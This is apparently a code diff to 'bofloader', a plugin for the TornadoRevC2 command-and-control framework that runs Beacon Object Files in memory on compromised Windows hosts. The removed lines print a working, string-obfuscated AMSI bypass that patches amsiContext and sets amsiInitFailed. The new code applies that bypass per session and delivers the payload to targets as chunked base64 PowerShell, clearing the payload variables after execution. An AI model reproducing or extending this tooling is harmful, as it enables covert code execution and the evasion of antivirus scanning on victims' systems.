@@ -21,7 +21,11 @@ _RAND = os.urandom(4).hex()          # 8 hex chars, unique per plugin load
 _USAGE = """bofloader — load and execute Beacon Object Files (BOFs) in-memory.
 
   Operator-side subcommands (no session required):
-    run bofloader import <file.cna>          Import a CNA, register its BOF commands
+    run bofloader import <file.cna|file.o|dir>
+                                             Import a CNA, a compiled .o/.obj,
+                                             or every .cna/.o in a directory.
+                                             Names for .o imports derive from
+                                             the filename (arch suffix stripped).
     run bofloader delete <name>              Remove a registered BOF command
     run bofloader list                       Show all registered BOF commands
     run bofloader compile <dir|file> [--arch x64|x86|both]
@@ -50,6 +54,8 @@ _USAGE = """bofloader — load and execute Beacon Object Files (BOFs) in-memory.
 
   Examples:
     run bofloader import ./bofs/whoami.cna
+    run bofloader import ./bofs/whoami.x64.o
+    run bofloader import ./bofs/          (imports every .cna and .o)
     run bofloader list
     run bofloader compile ./bofs/src
     run bofloader info ./bofs/whoami.x64.o
@@ -67,6 +73,9 @@ _USAGE = """bofloader — load and execute Beacon Object Files (BOFs) in-memory.
     - The C# loader class is compiled once per session and reused. No
       plugin reload is required to run another BOF.
     - The registry persists to logs/.tornadorevc2_bofs.json.
+    - AMSI bypass is skipped when 'run amsi_bypass <ID>' has already been
+      applied to the session in the current mode. Set TORNADO_AMSI_MODE or
+      run the amsi_bypass plugin to control the mode explicitly.
     - 'compile' requires mingw gcc/g++ on the operator machine. C sources
       use *-w64-mingw32-gcc; C++ sources use *-w64-mingw32-g++.
     - Beacon APIs provided: BeaconPrintf, BeaconOutput, BeaconDownload,
@@ -77,26 +86,18 @@ _USAGE = """bofloader — load and execute Beacon Object Files (BOFs) in-memory.
 """
 
 # --------------------------------------------------------------------------
-# AMSI bypass — reflection-only, runs before Add-Type
+# AMSI bypass — implemented in the amsi_bypass plugin. Bofloader imports the
+# bypass builder and the per-session state helpers from there so both plugins
+# share the same decision logic.
 # --------------------------------------------------------------------------
 
-_AMSI_BYPASS_PS = r'''
-try {
-  $t = [Ref].Assembly.GetType('System.Management.' + 'Automation.Amsi' + 'Utils')
-  if ($t) {
-    $f = $t.GetField('amsi' + 'Context','NonPublic,Static')
-    if ($f) {
-      $c = $f.GetValue($null)
-      if ($c -and $c -ne [IntPtr]::Zero) {
-        # Zero the session handle at offset 8 of the AMSI context struct.
-        [System.Runtime.InteropServices.Marshal]::WriteInt64([IntPtr]$c, 8, 0)
-      }
-    }
-    $g = $t.GetField('amsi' + 'InitFailed','NonPublic,Static')
-    if ($g) { $g.SetValue($null, $true) }
-  }
-} catch {}
-'''
+from .amsi_bypass import (
+    amsi_bypass_ps as _amsi_bypass_ps,
+    get_mode as _get_amsi_mode,
+    get_session_state as _amsi_get_state,
+    session_is_bypassed as _amsi_is_bypassed,
+    set_session_state as _amsi_set_state,
+)
 
 # --------------------------------------------------------------------------
 # Embedded beacon.h — written to a temp dir at compile time when no
@@ -297,10 +298,13 @@ public static class BofLoader {
     // Beacon API: output
     // =====================================================================
 
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate void D_BeaconPrintf(int type, IntPtr fmt,
         IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5,
         IntPtr a6, IntPtr a7, IntPtr a8, IntPtr a9, IntPtr a10);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate void D_BeaconOutput(int type, IntPtr data, int len);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate void D_BeaconDownload(IntPtr data, int len, int type);
 
     static D_BeaconPrintf  _del_printf   = _BeaconPrintfImpl;
@@ -381,10 +385,15 @@ public static class BofLoader {
     [StructLayout(LayoutKind.Sequential)]
     struct DATAP { public IntPtr original; public IntPtr buffer; public int length; public int size; }
 
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate int    D_DataParse(IntPtr p, IntPtr b, int s);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate IntPtr D_DataExtract(IntPtr p, IntPtr sz);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate int    D_DataInt(IntPtr p);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate short  D_DataShort(IntPtr p);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate int    D_DataLength(IntPtr p);
 
     static int _DataParse(IntPtr p, IntPtr b, int s) {
@@ -441,11 +450,17 @@ public static class BofLoader {
 
     static List<IntPtr> _fmtAllocs = new List<IntPtr>();
 
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate IntPtr D_FmtAlloc(IntPtr p, int maxsz);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate void   D_FmtReset(IntPtr p);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate void   D_FmtFree(IntPtr p);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate void   D_FmtAppend(IntPtr p, IntPtr text, int len);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate void   D_FmtPrintf(IntPtr p, IntPtr fmt, IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate IntPtr D_FmtToString(IntPtr p, IntPtr sz);
 
     static IntPtr _FmtAlloc(IntPtr p, int maxsz) {
@@ -518,8 +533,11 @@ public static class BofLoader {
     static IntPtr _GetValue(string k) { if (k == null) return IntPtr.Zero; IntPtr v; return _kv.TryGetValue(k, out v) ? v : IntPtr.Zero; }
     static bool   _RemoveValue(string k) { if (k == null) return false; return _kv.Remove(k); }
 
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate bool   D_AddValue(string k, IntPtr v);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate IntPtr D_GetValue(string k);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate bool   D_RemoveValue(string k);
 
     static D_AddValue    _del_add = _AddValue;
@@ -533,10 +551,13 @@ public static class BofLoader {
             return p.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
         } catch { return false; }
     }
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate bool D_IsAdmin();
     static D_IsAdmin _del_admin = _IsAdmin;
 
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate bool D_UseToken(IntPtr token);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
     delegate bool D_RevertToken();
     static bool _UseToken(IntPtr t) { return false; }
     static bool _RevertToken() { return false; }
@@ -550,6 +571,9 @@ public static class BofLoader {
     delegate int D_VEH(IntPtr info);
     static int _vehFired = 0;
     static D_VEH _vehDel = _VehCb;
+    // CONTINUE_SEARCH: report the fault and let the process's own SEH
+    // chain decide whether to survive it. This does NOT guarantee that
+    // the loader recovers from an arbitrary AV.
     static int _VehCb(IntPtr info) { _vehFired = 1; return 0; /* CONTINUE_SEARCH */ }
 
     // =====================================================================
@@ -595,7 +619,7 @@ public static class BofLoader {
             case "BeaconRevertToken":result = Marshal.GetFunctionPointerForDelegate(_del_rvtk); break;
             default:
                 if (name.StartsWith("Beacon")) {
-                    result = IntPtr.Zero;
+                    throw new Exception("Unsupported Beacon API symbol: " + name);
                 } else if (name.IndexOf('$') > 0) {
                     int d = name.IndexOf('$');
                     string lib  = name.Substring(0, d) + ".dll";
@@ -988,7 +1012,7 @@ public static class BofLoader {
                     _AppendOut("\n[BOF exception] " + ex.Message + "\n");
                 }
                 if (_vehFired != 0)
-                    _AppendOut("\n[BOF raised a native exception; loader survived]\n");
+                    _AppendOut("\n[BOF raised a native exception; outcome decided by host SEH chain]\n");
             } finally {
                 if (veh != IntPtr.Zero) RemoveVectoredExceptionHandler(veh);
                 VirtualFree(argsPtr, UIntPtr.Zero, MEM_RELEASE);
@@ -1043,20 +1067,96 @@ _MAX_BOF_BYTES = 2 * 1024 * 1024
 # PowerShell helpers
 # --------------------------------------------------------------------------
 
-def _bootstrap_ps():
+def _b64_chunk_lines(b64, var='$b', chunk_size=200, indent='  '):
+    """
+    Produce PowerShell lines that rebuild a base64 string from small chunks:
+
+        $b = 'AAA...'         (first chunk)
+        $b += 'BBB...'        (subsequent chunks)
+
+    Each emitted line stays well under any command-line limit (CMD is 8191
+    chars, some SSH paths truncate at 4 KB). Empty input produces
+    `$var = [string]::Empty` — no adjacent single quotes, so the result
+    survives transports that unescape `''` to `'`.
+    """
+    if not b64:
+        return f'{indent}{var} = [string]::Empty'
+    out = []
+    first = b64[:chunk_size]
+    out.append(f"{indent}{var} = '{first}'")
+    for i in range(chunk_size, len(b64), chunk_size):
+        out.append(f"{indent}{var} += '{b64[i:i + chunk_size]}'")
+    return "\n".join(out)
+
+
+# Sessions where we've already confirmed the loader is compiled.
+# Cleared automatically when the session disconnects.
+_LOADER_READY_SESSIONS = set()
+
+
+def _bootstrap_ps(session=None, want_amsi=None):
+    """
+    Build the PowerShell preamble for a BOF run.
+
+    want_amsi : str | None
+        The AMSI mode to apply if the session is not already bypassed.
+        When None, defaults to whatever TORNADO_AMSI_MODE says.
+    """
+    if want_amsi is None:
+        want_amsi = _get_amsi_mode()
+
+    # Look up session info + AMSI state.
+    info = None
+    if session is not None:
+        try:
+            info = session._handler._client_info(session._client_sock)
+        except Exception:
+            info = None
+
+    already_bypassed = False
+    if info is not None and want_amsi not in (None, 'none'):
+        try:
+            already_bypassed = _amsi_is_bypassed(info, desired_mode=want_amsi)
+        except Exception:
+            already_bypassed = False
+
+    # The bypass snippet (or empty if already applied, mode=none, or no info).
+    if want_amsi in (None, 'none') or already_bypassed:
+        amsi_snippet = ''
+    else:
+        amsi_snippet = _amsi_bypass_ps(want_amsi)
+
+    # Cache fast-path.
+    if session is not None:
+        try:
+            sid = getattr(session, 'session_id', None)
+            if sid is None:
+                _info = session._handler._client_info(session._client_sock)
+                sid = _info.get('id') if _info else None
+        except Exception:
+            sid = None
+        if sid is not None and sid in _LOADER_READY_SESSIONS:
+            return (
+                "$ProgressPreference='SilentlyContinue';"
+                "$ErrorActionPreference='Stop';"
+                + amsi_snippet +
+                f"if (-not ('{_CLASS_NAME}' -as [type])) {{\n"
+                f"  Write-Output '{_MARK_ERR}loader class missing from session cache'\n"
+                f"}}\n"
+                f"Write-Output '{_MARK_INFO}loader cached'\n"
+            )
+
     return (
-        # Silence PowerShell's own console noise before anything else.
         "$ProgressPreference='SilentlyContinue';"
         "$WarningPreference='SilentlyContinue';"
         "$VerbosePreference='SilentlyContinue';"
         "$InformationPreference='SilentlyContinue';"
         "$ErrorActionPreference='Stop';"
         "try{[Console]::OutputEncoding=[Text.Encoding]::UTF8}catch{};"
-        +
-        _AMSI_BYPASS_PS +
+        + amsi_snippet +
         f"$__bof_cached = [bool]('{_CLASS_NAME}' -as [type])\n"
         f"if (-not $__bof_cached) {{\n"
-        f"  $b = '{_CS_GZ_B64}'\n"
+        f"{_b64_chunk_lines(_CS_GZ_B64, var='$b', chunk_size=800, indent='  ')}\n"
         "  $raw = [Convert]::FromBase64String($b)\n"
         "  $ms  = New-Object IO.MemoryStream(,$raw)\n"
         "  $gz  = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)\n"
@@ -1070,7 +1170,7 @@ def _bootstrap_ps():
     )
 
 
-def _exec_ps(bof_gz_b64, args_b64, entry):
+def _exec_ps(bof_gz_b64, args_b64, entry, session=None, want_amsi=None):
     """
     Returns (powershell_script, markers) where markers is a 4-tuple:
         (mark_out, mark_ok, mark_err, mark_end)
@@ -1083,8 +1183,12 @@ def _exec_ps(bof_gz_b64, args_b64, entry):
     mark_err = f'__BOF{_RAND}{inst}E__:'
     mark_end = f'__BOF{_RAND}{inst}Z__'
 
-    ps = _bootstrap_ps() + f"""
-$gzBytes = [Convert]::FromBase64String('{bof_gz_b64}')
+    bof_chunked = _b64_chunk_lines(bof_gz_b64, var='$bof64', chunk_size=800, indent='')
+    arg_chunked = _b64_chunk_lines(args_b64,    var='$arg64', chunk_size=800, indent='')
+
+    ps = _bootstrap_ps(session=session, want_amsi=want_amsi) + f"""
+{bof_chunked}
+$gzBytes = [Convert]::FromBase64String($bof64)
 $outMs = New-Object IO.MemoryStream
 $zis = New-Object IO.Compression.DeflateStream(
     (New-Object IO.MemoryStream(,$gzBytes)),
@@ -1092,7 +1196,8 @@ $zis = New-Object IO.Compression.DeflateStream(
 $zis.CopyTo($outMs)
 $bofBytes = $outMs.ToArray()
 $zis.Dispose(); $outMs.Dispose()
-$argBytes = [Convert]::FromBase64String('{args_b64}')
+{arg_chunked}
+$argBytes = [Convert]::FromBase64String($arg64)
 try {{
   $lines = [{_CLASS_NAME}]::ExecuteBof($bofBytes, '{entry}', $argBytes)
   foreach ($l in $lines) {{
@@ -1105,6 +1210,8 @@ try {{
 $bofBytes = $null
 $argBytes = $null
 $gzBytes  = $null
+$bof64    = $null
+$arg64    = $null
 [System.GC]::Collect()
 Write-Output '{mark_end}'
 """
@@ -1643,6 +1750,170 @@ def _find_beacon_header(search_dir):
     return None
 
 
+# --------------------------------------------------------------------------
+# Pre-flight: probe only the headers the source files actually #include
+# --------------------------------------------------------------------------
+
+# ISO C / C++ standard headers — always shipped with the compiler.
+# Skipped during pre-flight because they cannot be missing on a working
+# toolchain.
+_STD_HEADERS = frozenset([
+    # C
+    'assert.h', 'complex.h', 'ctype.h', 'errno.h', 'fenv.h', 'float.h',
+    'inttypes.h', 'iso646.h', 'limits.h', 'locale.h', 'math.h', 'setjmp.h',
+    'signal.h', 'stdalign.h', 'stdarg.h', 'stdatomic.h', 'stdbool.h',
+    'stddef.h', 'stdint.h', 'stdio.h', 'stdlib.h', 'stdnoreturn.h',
+    'string.h', 'tgmath.h', 'threads.h', 'time.h', 'uchar.h', 'wchar.h',
+    'wctype.h',
+    # C++ (no extension)
+    'algorithm', 'any', 'array', 'atomic', 'bitset', 'cassert', 'cctype',
+    'cerrno', 'cfenv', 'cfloat', 'chrono', 'cinttypes', 'climits', 'clocale',
+    'cmath', 'codecvt', 'complex', 'condition_variable', 'csetjmp',
+    'csignal', 'cstdarg', 'cstddef', 'cstdint', 'cstdio', 'cstdlib',
+    'cstring', 'ctime', 'cwchar', 'cwctype', 'deque', 'exception',
+    'filesystem', 'forward_list', 'fstream', 'functional', 'future',
+    'initializer_list', 'iomanip', 'ios', 'iosfwd', 'iostream', 'istream',
+    'iterator', 'limits', 'list', 'locale', 'map', 'memory', 'mutex',
+    'new', 'numeric', 'optional', 'ostream', 'queue', 'random', 'ratio',
+    'regex', 'scoped_allocator', 'set', 'shared_mutex', 'sstream', 'stack',
+    'stdexcept', 'streambuf', 'string', 'string_view', 'system_error',
+    'thread', 'tuple', 'type_traits', 'typeindex', 'typeinfo',
+    'unordered_map', 'unordered_set', 'utility', 'valarray', 'variant',
+    'vector',
+])
+
+# Human-readable subsystem label for common Windows headers. Purely
+# cosmetic — unknown headers just show as the raw name.
+_HEADER_SUBSYSTEM = {
+    'windows.h':           'Core Win32',
+    'winsock2.h':          'Winsock 2',
+    'ws2tcpip.h':          'Winsock TCP/IP',
+    'mstcpip.h':           'TCP/IP constants',
+    'iphlpapi.h':          'IP Helper',
+    'netioapi.h':          'Network interfaces',
+    'winhttp.h':           'WinHTTP',
+    'wininet.h':           'WinINet',
+    'wincrypt.h':          'CryptoAPI',
+    'bcrypt.h':            'BCrypt',
+    'ncrypt.h':            'CNG',
+    'dpapi.h':             'DPAPI',
+    'tlhelp32.h':          'Toolhelp32',
+    'psapi.h':             'Process Status',
+    'lm.h':                'LAN Manager',
+    'lmaccess.h':          'LAN Manager',
+    'lmapibuf.h':          'LAN Manager',
+    'ntsecapi.h':          'LSA',
+    'ntstatus.h':          'NT status codes',
+    'sddl.h':              'SDDL',
+    'aclapi.h':            'ACL API',
+    'securitybaseapi.h':   'Security Base',
+    'wincred.h':           'Credential Manager',
+    'userenv.h':           'User Environment',
+    'shlwapi.h':           'Shlwapi',
+    'shlobj.h':            'Shell Objects',
+    'shellapi.h':          'Shell API',
+    'wtsapi32.h':          'Terminal Services',
+    'wlanapi.h':           'WLAN',
+    'netfw.h':             'Windows Firewall',
+    'winreg.h':            'Registry',
+    'commctrl.h':          'Common Controls',
+    'dbghelp.h':           'Debug Help',
+    'werapi.h':            'Error Reporting',
+    'setupapi.h':          'Setup API',
+    'cfgmgr32.h':          'Config Manager',
+    'rpc.h':               'RPC',
+    'rpcndr.h':            'RPC NDR',
+    'taskschd.h':          'Task Scheduler',
+    'objbase.h':           'COM',
+    'oleauto.h':           'OLE Automation',
+    'comdef.h':            'COM Definitions',
+    'wbemidl.h':           'WMI',
+    'wmiutils.h':          'WMI Utilities',
+    'wintrust.h':          'WinTrust',
+    'softpub.h':           'WinTrust',
+    'winsvc.h':            'Service Control',
+    'windns.h':            'DNS',
+    'dhcpcsdk.h':          'DHCP',
+    'nb30.h':              'NetBIOS',
+    'winspool.h':          'Print Spooler',
+    'swdevice.h':          'Software Device',
+    'iads.h':              'Active Directory (ADSI)',
+    'adshlp.h':            'Active Directory helper',
+}
+
+
+def _extract_includes(source_path):
+    """
+    Parse a .c/.cpp file and return a set of (header_name, is_angled) tuples.
+    Handles both `#include <header>` and `#include "header"`.
+    Comment lines and preprocessor directives without include are ignored.
+    """
+    headers = set()
+    try:
+        with open(source_path, 'r', encoding='utf-8', errors='replace') as f:
+            for raw in f:
+                line = raw.strip()
+                if not line.startswith('#'):
+                    continue
+                m = re.match(r'#\s*include\s*(<|")([^>"]+)[>"]', line)
+                if m:
+                    headers.add((m.group(2).strip(), m.group(1) == '<'))
+    except OSError:
+        pass
+    return headers
+
+
+def _probe_header(compiler, arch, is_cxx, header, timeout=10):
+    """Return (True, '') if the header resolves, else (False, error_snippet)."""
+    import tempfile, shutil
+    d = None
+    try:
+        d = tempfile.mkdtemp(prefix='tornado_hdr_')
+        ext = '.cpp' if is_cxx else '.c'
+        src = os.path.join(d, 'probe' + ext)
+        with open(src, 'w', encoding='utf-8') as f:
+            f.write(f'#include <{header}>\nint __tornado_probe(void) {{ return 0; }}\n')
+        mflag = '-m64' if arch == 'x64' else '-m32'
+        r = subprocess.run(
+            [compiler, '-fsyntax-only', mflag, src],
+            capture_output=True, text=True, timeout=timeout,
+        )
+        if r.returncode == 0:
+            return True, ''
+        err = (r.stderr or r.stdout or '').strip()
+        return False, '\n'.join(err.splitlines()[:3])
+    except subprocess.TimeoutExpired:
+        return False, f'timeout after {timeout}s'
+    except Exception as e:
+        return False, str(e)
+    finally:
+        if d:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+def _print_missing_header_hint(session, colors, arch, header):
+    """Report a missing header with the exact package to install per distro."""
+    desc = _HEADER_SUBSYSTEM.get(header, '')
+    label = header + (f'  ({desc})' if desc else '')
+    _emit(session, f"      {colors['yellow']}✗ {label}{colors['end']}")
+
+    if arch == 'x64':
+        pkg_deb  = 'mingw-w64-x86-64-dev'
+        pkg_fed  = 'mingw64-headers'
+        pkg_arc  = 'mingw-w64-crt'
+        pkg_msys = 'mingw-w64-x86_64-headers-git'
+    else:
+        pkg_deb  = 'mingw-w64-i686-dev'
+        pkg_fed  = 'mingw32-headers'
+        pkg_arc  = 'mingw-w64-crt'
+        pkg_msys = 'mingw-w64-i686-headers-git'
+
+    _emit(session, f"          Debian/Ubuntu : sudo apt install {pkg_deb}")
+    _emit(session, f"          Fedora        : sudo dnf install {pkg_fed}")
+    _emit(session, f"          Arch          : sudo pacman -S {pkg_arc}")
+    _emit(session, f"          MSYS2 (Win)   : pacman -S {pkg_msys}")
+
+
 # ==========================================================================
 # Output helpers (work with or without a live SessionContext)
 # ==========================================================================
@@ -1690,8 +1961,30 @@ def _result(session, name, report, detail=''):
 # ==========================================================================
 
 def _do_import(session, opts):
+    """Dispatcher — routes import by path type (.cna / .o / .obj / directory)."""
     colors = _colors_of(session)
-    cna = opts['cna']
+    path   = opts['path']
+
+    if not os.path.exists(path):
+        _emit(session, f"{colors['red']}Not found: {path}{colors['end']}")
+        return 1
+
+    if os.path.isdir(path):
+        return _import_directory(session, colors, path)
+
+    low = path.lower()
+    if low.endswith('.cna'):
+        return _import_cna(session, colors, path)
+    if low.endswith(('.o', '.obj')):
+        return _import_object(session, colors, path)
+
+    _emit(session, f"{colors['red']}Unsupported file type: {path}{colors['end']}")
+    _emit(session, "Accepted: .cna, .o, .obj, or a directory containing them")
+    return 1
+
+
+def _import_cna(session, colors, cna):
+    """Original CNA import path — unchanged behaviour."""
     if not os.path.isfile(cna):
         _emit(session, f"{colors['red']}CNA not found: {cna}{colors['end']}")
         return 1
@@ -1723,8 +2016,6 @@ def _do_import(session, opts):
     reg = _load_registry()
     added = []
     for name, meta in parsed.items():
-        # Resolve the BOF path now so the user gets an immediate warning if
-        # the object file is missing.
         bof_path = meta['path']
         if not os.path.isfile(bof_path):
             _emit(session, f"{colors['yellow']}  ! BOF file missing for '{name}': "
@@ -1734,6 +2025,7 @@ def _do_import(session, opts):
             'format': meta.get('format', ''),
             'desc':   meta.get('desc', ''),
             'source': os.path.abspath(cna),
+            'origin': 'cna',
         }
         added.append(name)
 
@@ -1752,6 +2044,193 @@ def _do_import(session, opts):
     _event(session, f"bofloader import: {cna} -> {added}")
     _result(session, 'bofloader', '\n'.join(added), f'import {cna}')
     return 0
+
+
+def _derive_name_from_object(path):
+    """
+    Derive a `bof <name>` identifier from a compiled BOF filename.
+      WhoAmI.x64.o         → whoami
+      EnumDeviceDrivers.o  → enumdevicedrivers
+      dir-list.x86.obj     → dir_list
+      5tools.o             → bof_5tools
+    Returns None if no usable name can be derived.
+    """
+    base = os.path.basename(path)
+
+    # Strip .o / .obj (case-insensitive)
+    for ext in ('.o', '.obj'):
+        if base.lower().endswith(ext):
+            base = base[:-len(ext)]
+            break
+
+    # Strip a trailing .x64 / .x86 arch suffix
+    for suf in ('.x64', '.x86'):
+        if base.lower().endswith(suf):
+            base = base[:-len(suf)]
+            break
+
+    # Sanitise to a valid identifier
+    name = re.sub(r'[^A-Za-z0-9_]', '_', base).strip('_')
+    if not name:
+        return None
+    if name[0].isdigit():
+        name = 'bof_' + name
+    return name
+
+
+def _import_object(session, colors, obj_path, forced_name=None):
+    """
+    Register a compiled .o / .obj as `bof <name>` — no CNA required.
+    If forced_name is given it's used as-is; otherwise the name is derived
+    from the filename with any .x64/.x86 arch suffix stripped.
+    """
+    if not os.path.isfile(obj_path):
+        _emit(session, f"{colors['red']}Not found: {obj_path}{colors['end']}")
+        return 1
+
+    # Validate the file is a COFF object we can actually run.
+    try:
+        with open(obj_path, 'rb') as f:
+            head = f.read(20)
+    except Exception as e:
+        _emit(session, f"{colors['red']}Failed to read {obj_path}: {e}{colors['end']}")
+        return 1
+
+    if len(head) < 20:
+        _emit(session, f"{colors['red']}File too small to be a COFF object: {obj_path}{colors['end']}")
+        return 1
+
+    arch = _arch_of(head)
+    if arch is None:
+        machine = struct.unpack('<H', head[:2])[0]
+        _emit(session,
+              f"{colors['red']}Unsupported COFF machine 0x{machine:04X} in "
+              f"{obj_path} (only AMD64 / I386){colors['end']}")
+        return 1
+
+    name = forced_name or _derive_name_from_object(obj_path)
+    if not name:
+        _emit(session,
+              f"{colors['red']}Cannot derive a command name from {os.path.basename(obj_path)}"
+              f"{colors['end']}")
+        return 1
+
+    reg      = _load_registry()
+    existing = reg.get(name)
+    # Warn if a CNA-registered command of the same name already exists.
+    if existing and existing.get('origin') == 'cna':
+        _emit(session,
+              f"{colors['yellow']}Warning: '{name}' was registered by "
+              f"{existing.get('source', '?')}; overwriting with {obj_path}{colors['end']}")
+
+    reg[name] = {
+        'path':   os.path.abspath(obj_path),
+        'format': '',   # no bof_pack format declared for a bare .o
+        'desc':   f'(imported from {os.path.basename(obj_path)}, arch={arch})',
+        'source': os.path.abspath(obj_path),
+        'origin': 'object',
+    }
+
+    if not _save_registry(reg):
+        _emit(session, f"{colors['red']}Failed to persist registry{colors['end']}")
+        return 1
+
+    _emit(session,
+          f"{colors['green']}Imported 1 BOF command from {obj_path}:{colors['end']}")
+    _emit(session,
+          f"  {colors['cyan']}{name:<20}{colors['end']}  "
+          f"arch={arch:<3}  file=ok")
+    _emit(session, f"{colors['yellow']}Use: bof <name> [args...]{colors['end']}")
+    _event(session, f"bofloader import: {obj_path} -> {name} (object, {arch})")
+    _result(session, 'bofloader', name, f'import {obj_path}')
+    return 0
+
+
+def _import_directory(session, colors, directory):
+    """
+    Walk a directory and import every .cna and .o/.obj we find.
+
+    Name-collision policy for .o files: if both Foo.x64.o and Foo.x86.o exist,
+    only Foo.x64.o is imported (target processes are usually 64-bit). The
+    x86 variant is reported as skipped and can be imported explicitly by
+    its full path if needed.
+    """
+    try:
+        entries = sorted(os.listdir(directory))
+    except OSError as e:
+        _emit(session, f"{colors['red']}Cannot read directory {directory}: {e}{colors['end']}")
+        return 1
+
+    cnas = [os.path.join(directory, f) for f in entries if f.lower().endswith('.cna')]
+    objs = [os.path.join(directory, f) for f in entries
+            if f.lower().endswith(('.o', '.obj'))]
+
+    if not cnas and not objs:
+        _emit(session,
+              f"{colors['yellow']}No .cna or .o/.obj files in {directory}{colors['end']}")
+        return 1
+
+    _emit(session,
+          f"{colors['cyan']}Importing from directory {directory}:{colors['end']}")
+    _emit(session, f"  CNAs    : {len(cnas)}")
+    _emit(session, f"  Objects : {len(objs)}")
+
+    # Group objects by base name (arch suffix stripped). When both arches
+    # exist for the same base, keep the plain name for x64 and register the
+    # x86 variant under <name>_x86.
+    counters = {}   # base_name -> list of paths in preference order
+
+    for o in objs:
+        n = _derive_name_from_object(o)
+        if not n:
+            continue
+        counters.setdefault(n, []).append(o)
+
+    renamed = []   # (final_name, path) for reporting
+    for base, paths in counters.items():
+        if len(paths) == 1:
+            renamed.append((base, paths[0]))
+            continue
+        # Two or more variants — pick x64 as primary, suffix the rest.
+        # Preference: .x64.o before .o before .obj before .x86.o
+        def _rank(p):
+            low = p.lower()
+            if low.endswith('.x64.o'):   return 0
+            if low.endswith('.obj'):     return 1
+            if low.endswith('.o'):       return 1
+            if low.endswith('.x86.o'):   return 2
+            return 3
+        paths_sorted = sorted(paths, key=_rank)
+        primary = paths_sorted[0]
+        renamed.append((base, primary))
+        for p in paths_sorted[1:]:
+            low = p.lower()
+            if low.endswith('.x86.o') or low.endswith('.x86.obj'):
+                suffix = '_x86'
+            elif low.endswith('.x64.o') or low.endswith('.x64.obj'):
+                suffix = '_x64'
+            else:
+                # Different extension but same base — disambiguate by filename
+                suffix = '_' + re.sub(r'[^A-Za-z0-9_]', '_',
+                                     os.path.basename(p)).strip('_')
+            renamed.append((base + suffix, p))
+
+    ok_count = 0
+    for c in cnas:
+        _emit(session, f"  {colors['blue']}cna : {os.path.basename(c)}{colors['end']}")
+        if _import_cna(session, colors, c) == 0:
+            ok_count += 1
+    for final_name, path in renamed:
+        _emit(session,
+              f"  {colors['blue']}obj : {os.path.basename(path)} "
+              f"-> {colors['cyan']}{final_name}{colors['end']}")
+        # Use the exact name we computed rather than the auto-derived one.
+        if _import_object(session, colors, path, forced_name=final_name) == 0:
+            ok_count += 1
+
+    _emit(session,
+          f"{colors['green']}Imported {ok_count} item(s) from {directory}{colors['end']}")
+    return 0 if ok_count > 0 else 1
 
 
 def _do_delete(session, opts):
@@ -1882,6 +2361,96 @@ def _do_compile(session, opts):
     if not compilers:
         _emit(session, f"{colors['red']}No mingw compiler available for any target{colors['end']}")
         _emit_install_hint(session, colors)
+        return 1
+
+    # ---- pre-flight: check only the headers the sources actually include ----
+    # Collect every #include across the sources. We probe:
+    #   - angled includes <...>       always
+    #   - quoted includes "..."       only if we recognise them as system headers
+    #     (project-local headers like "beacon.h" are staged next to the source
+    #      and would falsely fail a bare probe, so we skip those)
+    referenced_system = set()
+    referenced_local  = set()
+    for src in sources:
+        for hdr, is_angled in _extract_includes(src):
+            if hdr in _STD_HEADERS:
+                continue
+            if is_angled:
+                referenced_system.add(hdr)
+            elif hdr in _HEADER_SUBSYSTEM:
+                referenced_system.add(hdr)
+            else:
+                referenced_local.add(hdr)
+
+    if referenced_system:
+        _emit(session,
+              f"{colors['cyan']}Pre-flight: {len(referenced_system)} system "
+              f"header(s) referenced by the sources:{colors['end']}")
+        for h in sorted(referenced_system):
+            desc = _HEADER_SUBSYSTEM.get(h, '')
+            tag  = f"  ({desc})" if desc else ''
+            _emit(session, f"    {h}{tag}")
+    else:
+        _emit(session,
+              f"{colors['cyan']}Pre-flight: sources include no non-standard "
+              f"system headers.{colors['end']}")
+
+    if referenced_local:
+        _emit(session,
+              f"{colors['cyan']}Pre-flight: {len(referenced_local)} local "
+              f"header(s) — not probed (expected next to sources):{colors['end']}")
+        for h in sorted(referenced_local):
+            _emit(session, f"    {h}")
+
+    bad_arches     = set()
+    missing_by_arch = {}   # arch -> list of missing header names
+
+    for a in list(compilers.keys()):
+        cc, cxx  = compilers[a]
+        prober   = cc or cxx
+        use_cxx  = (cc is None and cxx is not None)
+
+        if prober is None or not referenced_system:
+            if prober is None:
+                bad_arches.add(a)
+            continue
+
+        missing = []
+        for h in sorted(referenced_system):
+            ok, _err = _probe_header(prober, a, is_cxx=use_cxx, header=h)
+            if not ok:
+                missing.append(h)
+
+        if not missing:
+            _emit(session,
+                  f"  {colors['green']}{a:<4} {len(referenced_system)}"
+                  f"/{len(referenced_system)} header(s) present"
+                  f"{colors['end']}")
+            continue
+
+        _emit(session,
+              f"  {colors['red']}{a:<4} {len(missing)} of "
+              f"{len(referenced_system)} header(s) missing:{colors['end']}")
+        for h in missing:
+            _print_missing_header_hint(session, colors, a, h)
+        missing_by_arch[a] = missing
+        # Any missing header aborts the compile for that architecture.
+        bad_arches.add(a)
+
+    for a in bad_arches:
+        compilers.pop(a, None)
